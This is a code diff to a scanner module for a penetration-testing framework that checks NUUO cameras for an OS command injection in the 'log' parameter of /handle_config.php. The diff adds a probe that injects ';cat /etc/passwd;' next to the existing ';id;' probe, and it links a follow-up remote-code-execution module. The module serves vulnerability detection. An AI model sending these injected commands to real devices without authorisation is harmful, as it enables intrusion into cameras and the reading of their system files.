@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 """NUUO Camera up to 20250203 contains a command injection caused by manipulation of the 'log' argument in /handl."""
 
+import re
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
 
@@ -48,7 +49,7 @@ class Module(Scanner, Http_client):
                 ],
                 'consumes_capabilities': [],
                 'option_bindings': {},
-                'suggested_followups': [],
+                'suggested_followups': ['exploits/linux/http/nuuo_cve_2025_1338_rce'],
             },
         },
         'references': [
@@ -60,14 +61,21 @@ class Module(Scanner, Http_client):
     }
 
     def run(self):
-        path = '/handle_config.php?log=;id;'
-        r = self.http_request(method='GET', path=path, allow_redirects=False)
-        if not r or r.status_code != 200:
-            return False
-        body = r.text or ""
-        body_all = ('/mtd/block4/log/', 'uid=', 'gid=',)
-        if all(m in body for m in body_all):
-            self.set_info(severity='critical', reason='NUUO Camera <=20250203 - OS Command Injection detected', path=path)
-            return True
+        probes = (
+            ('/handle_config.php?log=;id;', (r'uid=\d+', r'gid=\d+')),
+            ('/handle_config.php?log=;cat /etc/passwd;', (r'root:.*:0:0:',)),
+        )
+        for path, patterns in probes:
+            r = self.http_request(method='GET', path=path, allow_redirects=False)
+            if not r or r.status_code != 200:
+                continue
+            body = r.text or ''
+            if all(re.search(p, body) for p in patterns):
+                self.set_info(
+                    severity='critical',
+                    reason='NUUO Camera <=20250203 - OS Command Injection detected',
+                    path=path,
+                )
+                return True
         return False
 
